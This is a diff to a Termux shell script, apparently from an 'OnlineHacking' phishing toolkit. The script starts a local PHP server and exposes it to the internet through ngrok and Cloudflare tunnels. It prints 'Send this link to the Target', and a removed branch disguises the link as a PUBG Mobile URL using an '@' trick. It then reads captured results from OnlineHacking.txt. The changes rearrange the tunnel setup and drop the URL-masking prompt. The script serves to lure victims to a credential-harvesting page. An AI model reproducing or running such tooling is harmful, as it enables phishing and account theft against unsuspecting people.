@@ -13,8 +13,6 @@ echo ""
 read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Accepted This Notice \e[1;91m (Y/N) : \e[0m' option
 echo""
 echo""
-wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared
-chmod +x *
 echo""
 
 if [[ $option == *'N'* ]]; then
@@ -30,7 +28,6 @@ php="$(ps -efw | grep php | grep -v grep | awk '{print $2}')"
 ngrok="$(ps -efw | grep ngrok | grep -v grep | awk '{print $2}')"
 kill -9 $php
 kill -9 $ngrok
-kill -9 $cloudflared
 clear
 cd /data/data/com.termux/files/usr/bin/OnlineHacking/
 bash Logo.sh
@@ -44,19 +41,7 @@ echo ""
                  then 
                            cd /data/data/com.termux/files/usr/bin/SUMAN
                            cd X-Suit/
-			   echo ""
-			   echo ""
-                           printf "\e[31m[\e[32m★\e[31m]\e[32m Manually Start Ngrok \e[m "
-                           echo ""
-			   echo ""
-			   echo -e "\e[91m[\e[92m*\e[91m]\e[1;93m Open New Session (tab) Type This Command :\e[0m\e[1;36m Run-Ngrok  "
-                           echo ""
-			   echo ""
-			   echo ""
-                           read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Click ENTER to Continue \e[1;91m (enter) : \e[0m' option
                            echo""
-                           echo""
-                           echo ""
 			   echo ""
                            echo -e $" [\e[92m*\e[91m]\e[1;93m Online Hacking Server Connect... \e[0m  "
 			   sleep 2
@@ -70,11 +55,27 @@ echo ""
 			   echo -e $" [\e[92m*\e[91m]\e[1;93m PHP Server Now Startng ... \e[0m  "
                            echo ""
 			   php -S 127.0.0.1:4444 > /dev/null 2>&1 &
+                           sleep 3
 			   echo ""
+			   ./ngrok http 4444 > /dev/null 2>&1 &
+			   link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
+			   
+   echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://127.0.0.1:4444 ${GREEN})"
+	{ sleep 1; }
+	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
 
-	echo ""		   
-		   
+    if [[ `command -v termux-chroot` ]]; then
+		sleep 2 && termux-chroot ./cloudflared tunnel -url 127.0.0.1:4444 --logfile .cld.log > /dev/null 2>&1 &
+    else
+        sleep 2 && ./cloudflared tunnel -url 127.0.0.1:4444 --logfile .cld.log > /dev/null 2>&1 &
+    fi
+
+	{ sleep 8; clear; }
 	
+	cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cld.log")
+	cldflr_link1=${cldflr_link#https://}
+			   
+			   
 			   echo ""
                            echo ""
                            echo ""
@@ -109,24 +110,18 @@ echo -e " \e[97mTelegram : \e[0m\e[34mhttps://telegram.dog/OnlineHacKing \e[0m\n
                            echo ""
 			   echo ""
                            echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m \e[0m\e[1;36m Share Ngrok Link and Using "
-			   echo "" 
-                         echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://127.0.0.1:4444 ${GREEN})"
-	{ sleep 1; }
-	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
-
-    if [[ `command -v termux-chroot` ]]; then
-		sleep 2 && termux-chroot ./cloudflared tunnel -url 127.0.0.1:4444 --logfile .cld.log > /dev/null 2>&1 &
-    else
-        sleep 2 && ./cloudflared tunnel -url 127.0.0.1:4444 --logfile .cld.log > /dev/null 2>&1 &
-    fi
-
-	{ sleep 8; clear; }
-	
-	cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cld.log")
-	cldflr_link1=${cldflr_link#https://}
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$cldflr_link"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}fack@$cldflr_link1"
 			   echo ""
+			   echo ""
+                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
+                           printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$cldflr_link                                   
+                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
+                           printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
+                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                           fi
+			   echo ""
+			   
+			   
 			   
                            if [[ -e OnlineHacking.txt ]]; then
                            > OnlineHacking.txt
@@ -167,8 +162,6 @@ echo -e " \e[97mTelegram : \e[0m\e[34mhttps://telegram.dog/OnlineHacKing \e[0m\n
 			   echo -e $" [\e[92m*\e[91m]\e[1;93m PHP Server Now Startng ... \e[0m  "
                            echo ""
 			   php -S 127.0.0.1:4444 > /dev/null 2>&1 &
-			   ./ngrok http 4444 > /dev/null 2>&1 &
-			   link=$(curl -s -N http://127.0.0.1:4444/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                            sleep 3
 			   echo ""
                            echo ""
@@ -204,19 +197,6 @@ echo -e " \e[97mTelegram : \e[0m\e[34mhttps://telegram.dog/OnlineHacKing \e[0m\n
                            echo ""
 			   echo ""
                            echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m \e[0m\e[1;36m Share Ngrok Link and Using "
-			   echo "" 
-                           read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
-                           echo ""
-                           if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
-                           then
-                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                           printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://www.pubgmobile.com-@$link                                    
-                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
-                           else
-                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                           printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
-                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
-                           fi
 			   echo ""
                            
                            if [[ -e OnlineHacking.txt ]]; then
